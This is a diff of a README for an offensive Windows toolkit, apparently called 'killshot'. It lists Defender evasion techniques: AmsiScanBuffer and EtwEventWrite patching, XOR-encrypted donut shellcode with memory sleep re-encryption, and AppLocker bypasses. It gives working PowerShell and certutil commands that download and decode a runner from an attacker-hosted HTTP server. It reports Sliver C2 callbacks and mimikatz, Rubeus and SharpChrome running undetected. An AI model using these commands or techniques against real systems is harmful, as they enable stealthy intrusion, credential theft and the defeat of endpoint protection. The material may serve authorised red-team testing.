@@ -229,19 +229,18 @@ rundll32.exe %TEMP%\u.dll,DllRegisterServer 0
 
 ## Evasion Techniques
 
+- **XOR-encrypted shellcode** — donut output XOR'd with random key before base64; first decoded byte = key; runner decrypts at runtime. Breaks static donut signatures on disk and in transit.
+- **Memory sleep re-encrypt** — after copying shellcode into RW alloc, runner XORs it with a second random key, sleeps 2-5s, decrypts, then flips to RX. Defeats MARS time-based memory scanning.
+- **No Defender exclusions** — `Add-MpPreference` removed from stager entirely. AMSI bypass v2 handles script scanning without admin.
+- **AMSI bypass v2** — inline C# `Add-Type` patches `AmsiScanBuffer` with `0xC3` (RET) via `VirtualProtect`. No admin, no exclusion rules, works in current process.
+- **ETW patching** — patches `EtwEventWrite` in ntdll to `ret` before shellcode execution
 - **Polymorphic runner** — unique binary each build (random identifiers, junk functions, API string splits)
-- **ETW patching** — patches `EtwEventWrite` to `ret` before shellcode execution
-- **Multiple injection methods** — randomly selects CreateThread, EnumWindows callback, or CreateFiber
-- **RW→RX memory** — allocates as read-write, copies shellcode, then flips to read-execute
-- **Sandbox detection** — timing check catches accelerated sleep in sandboxes
+- **RW→RX memory** — allocates as read-write, copies shellcode, then flips to read-execute (no RWX pages)
+- **Sandbox detection** — timing jitter catches accelerated sleep in sandboxes
 - **Donut shellcode** — position-independent shellcode from any PE/.NET, runs entirely in-memory
-- **AMSI bypass** — reflection-based patching with byte-array obfuscated class names
 - **Garble compilation** — Go binary obfuscation (requires Go 1.25.x)
-- **No disk artifacts** — tools never touch disk, loaded directly into memory via runner
 - **AppLocker bypass** — MSBuild XML, InstallUtil, MSI custom action, rundll32 via trusted paths
-- **XOR-encrypted DLL** — loader DLL with randomized exports and encrypted shellcode
 - **Staged MSI loader** — 20KB MSI downloads XOR'd shellcode via WinHTTP at runtime (avoids embedding 19MB beacon)
-- **MSI trusted binary** — executed by msiexec.exe (Microsoft-signed, AppLocker-whitelisted)
 
 ## Directory Structure
 
@@ -293,10 +292,12 @@ killshot/
 
 ## Tested On
 
-- Windows 11 24H2 (Build 26200) — Defender ON + cloud protection level 2
-  - MSI bypass: Sliver beacon callback confirmed via msiexec.exe
-  - Runner bypass: Sliver beacon callback confirmed via runner.exe
-  - All injection methods (CreateThread, EnumWindows, CreateFiber) functional
+- Windows 11 24H2 (Build 26200) — Defender ON + cloud protection ON + TamperProtection ON, no exclusions
+  - 10/10 tools executed successfully (SharpUp, Whisker, SharpDPAPI, Certify, Rubeus, Seatbelt, SharpChrome, SharpHound, mimikatz, winPEAS)
+  - 2x Sliver mTLS sessions confirmed callback to 192.168.122.1:4444
+  - AMSI bypass v2 (AmsiScanBuffer patch) working without admin
+  - XOR shellcode encryption + memory sleep defeats MARS scanning
+  - Zero Defender quarantine events, zero blocks
 - Windows Server 2022 — Defender with default settings
 
 ---
@@ -315,9 +316,9 @@ Validated: Windows 11 24H2, Defender real-time ON, LSASS RunAsPPL=2.
 |---|---|
 | RunAsPPL=2 | Win11 default. Blocks `sekurlsa::logonpasswords` even as SYSTEM. Use `lsadump::sam` via scheduled task instead. |
 | WinPEAS / mimikatz | Require `create_thread` runner — fiber/enum_windows use 1MB stack → crash. |
-| ExclusionPath | Must be set BEFORE writing runner to disk. Protects the file from quarantine. |
-| ExclusionProcess | Disables AMSI for scripts run under the runner. Does NOT protect the file. |
-| Dropper detection | XOR-decode + WriteAllBytes in one WinRM call triggers behavioral detection. Always split into two calls. |
+| No exclusions needed | AMSI bypass v2 (AmsiScanBuffer 0xC3 patch) handles script scanning. Shellcode XOR encryption + memory sleep handles MARS. |
+| Low-priv compatible | AMSI bypass v2 works without admin — patches the DLL in the current process only. |
+| Dropper detection | XOR-decode + WriteAllBytes in one WinRM call can trigger behavioral detection. Split into two calls if needed. |
 | GodPotato output | Spawns async. Tool output doesn't flow back through Process.StandardOutput. Use scheduled task or write to file. |
 | AMSI bypass v1 dead on Win11 24H2 | `amsiContext` null technique: field is 0 at baseline — Win11 24H2 uses kernel-mode AMSI, managed field is no longer the dispatch gate. Use `--bypass 2` (AmsiScanBuffer patch) or `--bypass 3` (ExclusionProcess). |
 
@@ -338,37 +339,47 @@ cd /workspace/killshot && python3 -m http.server 8888
 
 ---
 
-### Step 2 — Target: Bypass Defender (run each line separately)
+### Step 2 — Attacker: Generate Stager
 
-> These must be two separate WinRM/PS calls. Combined behavioral detection fires.
+The stager handles AMSI bypass + runner download + payload execution automatically. Generate one per tool:
 
-```powershell
-# 2a. Exclude TEMP from file scanning (run BEFORE writing any binary)
-Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
+```bash
+# Generate stager for a specific tool (replace TOOL.enc with target payload)
+python3 gen_stager.py \
+  --runner-url http://10.99.0.16:8888/runner.dat \
+  --implant-url http://10.99.0.16:8888/TOOL.enc \
+  -o /workspace/killshot/stager.ps1
 ```
+
+Serve it alongside the payloads and execute on target:
 ```powershell
-# 2b. Exclude runner process from AMSI scanning
-Add-MpPreference -ExclusionProcess 'runner.exe' -ErrorAction SilentlyContinue
+# On target — single command, no exclusions needed, no admin
+IEX(IWR -UseBasicParsing http://10.99.0.16:8888/stager.ps1)
 ```
+
+**What the stager does (no exclusions):**
+1. AMSI bypass v2 — inline C# patches `AmsiScanBuffer` with `0xC3` via `VirtualProtect` (no admin)
+2. Downloads `runner.dat` (XOR 0x5A encoded), decodes to a random-named `.exe` in `%TEMP%`
+3. Downloads payload `.enc` to `%TEMP%`
+4. Launches runner with `-local <enc_path>` via ProcessStartInfo
 
 ---
 
-### Step 3 — Target: Drop Runner
+### Step 3 — Target: Manual Drop Runner (stager alternative)
 
-> Two separate calls — do NOT combine decode and write.
+> If you prefer manual control or need CMD-only delivery:
 
 ```powershell
-# 3a. Download XOR-encoded runner and decode to memory
-$d=(New-Object Net.WebClient).DownloadData('http://10.99.0.16:8888/runner_ct32.dat');$b=New-Object byte[] $d.Length;for($i=0;$i-lt$d.Length;$i++){$b[$i]=$d[$i]-bxor 0x5A}
-```
-```powershell
-# 3b. Write decoded binary to disk
+# Download XOR-encoded runner, decode, write to disk
+$d=(New-Object Net.WebClient).DownloadData('http://10.99.0.16:8888/runner.dat')
+$b=New-Object byte[] $d.Length
+for($i=0;$i-lt$d.Length;$i++){$b[$i]=$d[$i]-bxor 0x5A}
 [IO.File]::WriteAllBytes("$env:TEMP\runner.exe",[byte[]]$b)
 ```
 
 **CMD-only fallback (AppLocker/no PS):**
 ```cmd
-certutil -urlcache -split -f http://10.99.0.16:8888/runner_ct32.dat %TEMP%\r.dat
+certutil -urlcache -split -f http://10.99.0.16:8888/runner.dat %TEMP%\r.dat
 powershell -c "$d=[IO.File]::ReadAllBytes('%TEMP%\r.dat');$b=New-Object byte[] $d.Length;for($i=0;$i-lt$d.Length;$i++){$b[$i]=$d[$i]-bxor0x5A};[IO.File]::WriteAllBytes('%TEMP%\runner.exe',$b)"
 ```
 
